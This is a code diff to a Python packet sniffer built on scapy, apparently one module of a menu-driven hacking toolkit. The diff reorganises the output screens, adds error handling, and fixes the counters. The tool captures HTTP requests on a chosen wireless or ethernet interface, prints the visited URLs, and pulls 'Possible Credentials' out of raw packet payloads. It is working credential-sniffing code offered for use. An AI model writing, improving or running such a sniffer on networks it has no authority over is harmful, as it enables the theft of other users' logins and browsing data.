@@ -9,7 +9,6 @@ import netifaces
 import scapy.all as scapy
 from scapy.layers import http
 
-
 # Main function
 def packetsniffer_main():
 
@@ -32,52 +31,71 @@ def packetsniffer_main():
             while True:
                 interface_set = input('\u001b[33mINTERFACE \u001b[37m> ').lower()
                 if interface_set == 'wlan0' or interface_set == 'wlan1' or interface_set == 'wlan2' or interface_set == 'wlan3' or interface_set == 'mon0' or interface_set == 'mon1' or interface_set == 'mon2' or interface_set == 'mon3' or interface_set == 'wlp5s0' or interface_set == 'wlp5s1' or interface_set == 'wlp5s2' or interface_set == 'wlp5s3' or interface_set == 'eth0' or interface_set == 'eth1' or interface_set == 'eth2' or interface_set == 'eth3':
-                    functions()
+                    output()
+                    result()
                 else:
                     print('\u001b[31m[-] Invalid Input.')
                     continue
         except KeyboardInterrupt:
             exit_shell()
+        except OSError:
+            print('\u001b[31m[-] Unable To Locate ' + str(interface_set))
+            os.system('sleep 2')
+            packetsniffer_main()
 
-    def functions():
-        os.system(clear_screen)
-        print(logo)
-        print('')
-        print(line)
-        print(packetsniffer_banner)
-        print(line)
-        print('')
-        print(author)
-        print('Output:')
-        print('')
-        print('\tControls')
-        print('\t--------')
-        print('\tStop: CTRL+C')
-        print('')
-        sniff(interface_set)
+    # Function that displays live output
+    def output():
+        try:
+            global total_requests
+            global total_credentials
+            total_requests = 0
+            total_credentials = 0
+            os.system(clear_screen)
+            print(logo)
+            print('')
+            print(line)
+            print(packetsniffer_banner)
+            print(line)
+            print('')
+            print(author)
+            print('Output:')
+            print('')
+            print('\tControls')
+            print('\t--------')
+            print('\tStop: CTRL+C')
+            print('')
+            sniff(interface_set)
+        except KeyboardInterrupt:
+            result()
 
     # Function that shows all available and unavailable interfaces
     def ips():
-        x = netifaces.interfaces()
+        try:
+            x = netifaces.interfaces()
 
-        for i in x:
-            if i == 'wlan0' or i == 'wlan1' or i == 'wlan2' or i == 'wlan3' or i == 'mon0' or i == 'mon1' or i == 'mon2' or i == 'mon3' or i == 'wlp5s0' or i == 'wlp5s1' or i == 'wlp5s2' or i == 'wlp5s3' or i == 'eth0' or i == 'eth1' or i == 'eth2' or i == 'eth3':
-                print('\n\t[+] Available Interface: ' + i)
-            elif i != 'lo' or i != 'tun0' or i != 'tun1' or i != 'tun2' or i != 'tun3':
-                print('\n\t[-] Unavailable Interface: ' + i)
+            for i in x:
+                if i == 'wlan0' or i == 'wlan1' or i == 'wlan2' or i == 'wlan3' or i == 'mon0' or i == 'mon1' or i == 'mon2' or i == 'mon3' or i == 'wlp5s0' or i == 'wlp5s1' or i == 'wlp5s2' or i == 'wlp5s3' or i == 'eth0' or i == 'eth1' or i == 'eth2' or i == 'eth3':
+                    print('\n\t[+] Available Interface: ' + i)
+                elif i != 'lo' or i != 'tun0' or i != 'tun1' or i != 'tun2' or i != 'tun3':
+                    print('\n\t[-] Unavailable Interface: ' + i)
+        except KeyboardInterrupt:
+            exit_shell()
 
+    # Function that sniffs
     def sniff(interface):
         try:
             scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
         except KeyboardInterrupt:
             result()
 
+    # Function that gets urls
     def get_url(packet):
         try:
             return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
         except KeyboardInterrupt:
             result()
 
+    # Function that gets login info
     def get_login_info(packet):
         try:
             if packet.haslayer(scapy.Raw):
@@ -89,23 +107,23 @@ def packetsniffer_main():
         except KeyboardInterrupt:
             result()
 
+    # Function that displays packets
     def process_sniffed_packet(packet):
-        global total_requests
-        global total_credentials
-        total_requests = 0
-        total_credentials = 0
         try:
+            global total_requests
+            global total_credentials
             if packet.haslayer(http.HTTPRequest):
                 url = get_url(packet)
                 print("\t\u001b[33;1m[+] \u001b[32;1mHTTP Request \u001b[37;1m>> \u001b[36;1m" + url.decode())
-                total_requests += 1
+                total_requests = total_requests + 1
                 login_info = get_login_info(packet)
                 if login_info:
                     print("\t\u001b[33;1m[+] \u001b[32;1mPossible Credentials \u001b[37;1m>> \u001b[43m\u001b[31m" + login_info + "\u001b[0m\u001b[31;1m")
-                    total_credentials += 1
+                    total_credentials = total_credentials + 1
         except KeyboardInterrupt:
             result()
 
+    # Function that displays result
     def result():
         try:
             os.system(clear_screen)
@@ -118,10 +136,14 @@ def packetsniffer_main():
             print(author)
             print('Result:')
             print('')
-            print('INTERFACE: ' + interface_set)
+            print('\tInput')
+            print('\t-----')
+            print('\tINTERFACE: ' + interface_set)
             print('')
-            print('TOTAL REQUESTS: ' + str(total_requests))
-            print('TOTAL CREDENTIALS: ' + str(total_credentials))
+            print('\tOutput')
+            print('\t------')
+            print('\tTOTAL REQUESTS: ' + str(total_requests))
+            print('\tTOTAL CREDENTIALS: ' + str(total_credentials))
             print('')
             print('\t1): New')
             print('\t2): Exit')
